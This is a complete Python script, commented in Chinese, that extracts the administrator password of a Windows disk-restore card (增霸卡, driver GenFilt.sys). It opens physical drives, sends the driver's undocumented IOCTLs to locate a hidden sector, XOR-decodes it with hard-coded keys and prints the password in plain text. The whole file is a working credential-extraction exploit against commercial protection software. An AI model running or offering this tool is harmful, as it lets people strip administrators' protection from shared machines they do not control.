import ctypes
import sys
import os

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

IOCTL_GET_LBA = 0x72054
IOCTL_READ_SECTOR = 0x7201C
IOCTL_GET_LBA2 = 0x7205C

PWD_SECTOR_OFFSET = 6410
KEY1 = 0x48414947
KEY2 = 0x55414E47
SECTOR_SIZE = 512

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

kernel32.CreateFileA.argtypes = [ctypes.c_char_p, ctypes.c_uint32, ctypes.c_uint32,
                                 ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32,
                                 ctypes.c_void_p]
kernel32.CreateFileA.restype = ctypes.c_void_p

kernel32.DeviceIoControl.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p,
                                     ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32,
                                     ctypes.POINTER(ctypes.c_uint32), ctypes.c_void_p]
kernel32.DeviceIoControl.restype = ctypes.c_int

kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
kernel32.CloseHandle.restype = ctypes.c_int


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def decode_ioctl(code):
    """CTL_CODE 反解 (METHOD_FROM_CTL_CODE 在部分 SDK 缺失, 手工计算)"""
    device = (code >> 16) & 0xFFFF
    access = (code >> 14) & 0x3
    function = (code >> 2) & 0xFFF
    method = code & 0x3
    return "DeviceType=0x%04X Function=0x%03X Access=%d Method=%d" % (
        device, function, access, method)


def open_drive(index, write=True):
    name = "\\\\.\\PhysicalDrive%d" % index
    access = GENERIC_READ | (GENERIC_WRITE if write else 0)
    h = kernel32.CreateFileA(name.encode("ascii"), access,
                             FILE_SHARE_READ | FILE_SHARE_WRITE, None,
                             OPEN_EXISTING, 0, None)
    if h == INVALID_HANDLE_VALUE:
        return None, name, ctypes.get_last_error()
    return h, name, 0


def ioctl(h, code, buf, in_len, out_len):
    returned = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, code, buf, in_len, buf, out_len,
                                  ctypes.byref(returned), None)
    return bool(ok), returned.value, ctypes.get_last_error()


def probe(index):
    res = {"index": index, "opened": False, "base_lba": None,
           "read_ok": False, "password": None, "raw": None, "notes": []}

    h, name, err = open_drive(index, write=True)
    if h is None:
        h, name, err = open_drive(index, write=False)
        if h is None:
            res["notes"].append("CreateFileA 失败, GetLastError=%d" % err)
            return res
        res["notes"].append("以只读方式打开")
    res["opened"] = True

    try:
        buf = ctypes.create_string_buffer(8)
        ok, ret, err = ioctl(h, IOCTL_GET_LBA, buf, 8, 8)
        if not ok:
            res["notes"].append("IOCTL 0x72054 失败, err=%d" % err)
        else:
            lba = int.from_bytes(buf.raw[:8], "little")
            res["base_lba"] = lba
            res["notes"].append("IOCTL 0x72054 成功: baseLBA=%d (0x%X), 返回字节=%d"
                                % (lba, lba, ret))
        if not res["base_lba"]:
            return res

        target = res["base_lba"] + PWD_SECTOR_OFFSET
        sbuf = ctypes.create_string_buffer(SECTOR_SIZE)
        hdr = target.to_bytes(8, "little") + (1).to_bytes(8, "little")
        ctypes.memmove(sbuf, hdr, 16)
        ok, ret, err = ioctl(h, IOCTL_READ_SECTOR, sbuf, SECTOR_SIZE, SECTOR_SIZE)
        if not ok:
            res["notes"].append("IOCTL 0x7201C 失败, err=%d (LBA=%d)" % (err, target))
            return res
        raw = sbuf.raw[:8]
        res["read_ok"] = True
        res["raw"] = raw

        b = bytearray(sbuf.raw[:SECTOR_SIZE])
        k1 = KEY1.to_bytes(4, "little")
        k2 = KEY2.to_bytes(4, "little")
        for i in range(4):
            b[i] ^= k1[i]
            b[4 + i] ^= k2[i]
        res["password_full"] = bytes(b[:8])
        res["sector"] = bytes(b)

        pwd = bytes(b[:8]).split(b"\x00")[0]
        res["password"] = pwd
    finally:
        kernel32.CloseHandle(h)
    return res


def printable(b):
    return "".join(chr(c) if 32 <= c < 127 else "." for c in b)


def main():
    max_disk = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    print("=" * 74)
    print(" 增霸卡管理员密码读取工具 — IOCTL 0x72054 / 0x7201C 复现")
    print(" 目标扇区: baseLBA + %d (0x190A), 双密钥 XOR 0x%08X / 0x%08X"
          % (PWD_SECTOR_OFFSET, KEY1, KEY2))
    print("=" * 74)
    print("管理员权限        : %s" % is_admin())
    print("IOCTL 0x72054     : %s" % decode_ioctl(IOCTL_GET_LBA))
    print("IOCTL 0x7201C     : %s" % decode_ioctl(IOCTL_READ_SECTOR))
    print()

    if not is_admin():
        print("[!] 未以管理员身份运行, 直接访问 \\\\.\\PhysicalDriveN 将被拒绝。")
        print("    请用管理员权限的终端重新执行本脚本。")
        return 2

    found = False
    for i in range(max_disk):
        r = probe(i)
        if not r["opened"]:
            if i == 0:
                print("[%2d] 无法打开: %s" % (i, "; ".join(r["notes"])))
            continue
        print("[%2d] 已打开 PhysicalDrive%d" % (i, i))
        for n in r["notes"]:
            print("      %s" % n)
        if r["read_ok"]:
            found = True
            sec = r["sector"]
            print("      --- 扇区前 32 字节 (已解密) ---")
            print("      HEX : %s" % " ".join("%02X" % c for c in sec[:32]))
            print("      ASCII: %s" % printable(sec[:32]))
            print("      密码明文 : %r" % r["password"])
            print("      8 字节全文: %s" % " ".join("%02X" % c for c in r["password_full"]))
            if r["raw"] == b"GIAHGNAU":
                print("      >>> 哨兵命中: 该卡管理员密码为【空】(未设置)")
            else:
                print("      >>> 管理员密码 = %s"
                      % r["password"].decode("gbk", "replace"))
        print()

    if not found:
        print("[-] 未在任何物理盘上发现增霸卡数据区。")
        print("    可能原因: 本机未安装/未加载还原卡驱动 (GenFilt.sys 等),")
        print("    或驱动未响应 0x72054 探测, 或数据区在非物理盘设备上。")
    return 0 if found else 1


if __name__ == "__main__":
    sys.exit(main())
